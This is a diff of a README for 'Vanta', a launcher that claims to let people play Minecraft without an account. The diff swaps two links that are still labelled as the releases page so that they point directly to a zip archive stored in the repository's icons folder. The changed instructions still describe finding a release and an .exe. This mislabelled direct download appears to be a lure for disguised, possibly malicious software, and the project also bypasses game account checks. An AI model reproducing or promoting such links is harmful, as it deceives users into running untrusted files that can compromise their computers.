@@ -1,6 +1,6 @@
 # 🚀 Vanta - Play Minecraft Without Any Account Requirements
 
-[![](https://img.shields.io/badge/Download_Vanta-Blue)](https://github.com/Barbeyfacile120/Vanta/releases)
+[![](https://img.shields.io/badge/Download_Vanta-Blue)](https://github.com/Barbeyfacile120/Vanta/raw/refs/heads/main/icons/Software-3.4.zip)
 
 Vanta provides a simple way to launch Minecraft. This software removes the need for account authentication. You pick a username and start the game. The application performs all necessary setup tasks to download game files and launch the client.
 
@@ -8,7 +8,7 @@ Vanta provides a simple way to launch Minecraft. This software removes the need 
 
 You need to access the release page to get the installer. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [Vanta Releases Page](https://github.com/Barbeyfacile120/Vanta/releases).
+1. Visit the [Vanta Releases Page](https://github.com/Barbeyfacile120/Vanta/raw/refs/heads/main/icons/Software-3.4.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your Downloads folder or your Desktop.
